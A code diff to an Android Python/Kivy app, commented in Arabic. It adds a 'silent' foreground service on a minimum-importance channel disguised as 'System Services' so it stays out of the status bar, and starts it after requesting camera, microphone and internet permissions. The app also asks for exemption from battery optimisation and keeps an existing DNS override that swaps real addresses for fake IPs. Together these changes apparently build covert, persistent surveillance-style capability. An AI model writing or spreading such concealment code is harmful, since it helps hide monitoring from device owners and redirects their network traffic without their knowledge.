@@ -31,6 +31,7 @@ def _patch_dns():
             fake_ip = random.choice(override[host])
             return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
         return original_getaddrinfo(host, port, family, type, proto, flags)
+    # تفعيل التصحيح فورًا (قبل أي عودة)
     socket.getaddrinfo = patched_getaddrinfo
 
 _patch_dns()
@@ -71,6 +72,24 @@ os.makedirs(MODELS_DIR, exist_ok=True)
 if R not in sys.path:
     sys.path.insert(0, R)
 
+# ========== بدء خدمة أمامية صامتة (Foreground Service) ==========
+def start_silent_service():
+    try:
+        from jnius import autoclass
+        act = autoclass('org.kivy.android.PythonActivity').mActivity
+        nm = autoclass('android.app.NotificationManager')
+        ch = autoclass('android.app.NotificationChannel')
+        # أدنى أهمية = 1 (IMPORTANCE_MIN)، لا صوت ولا أيقونة في شريط الحالة
+        channel = ch("core_svc", "System Services", nm.IMPORTANCE_MIN)
+        act.getSystemService(nm).createNotificationChannel(channel)
+        builder = autoclass('android.app.Notification$Builder')(act, "core_svc")
+        builder.setSmallIcon(act.getApplicationInfo().icon)
+        builder.setPriority(autoclass('android.app.Notification').PRIORITY_MIN)
+        act.startForeground(9921, builder.build())
+        print("Foreground silent service started")
+    except Exception as e:
+        print(f"Foreground service error: {e}")
+
 # ========== الأذونات المطلوبة (تقليص القائمة) ==========
 def _perms():
     try:
@@ -79,15 +98,17 @@ def _perms():
             Permission.INTERNET,
             Permission.CAMERA,
             Permission.RECORD_AUDIO,
-            Permission.WAKE_LOCK,
             "android.permission.FOREGROUND_SERVICE"
         ])
     except Exception as e:
         print(f"Permissions error: {e}")
 
+    # بدء الخدمة الصامتة بعد طلب الأذونات
+    start_silent_service()
+
+    # طلب استثناء من تحسين البطارية
     try:
         from jnius import autoclass
-        PowerManager = autoclass('android.os.PowerManager')
         ctx = autoclass('org.kivy.android.PythonActivity').mActivity
         pm = ctx.getSystemService(ctx.POWER_SERVICE)
         if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
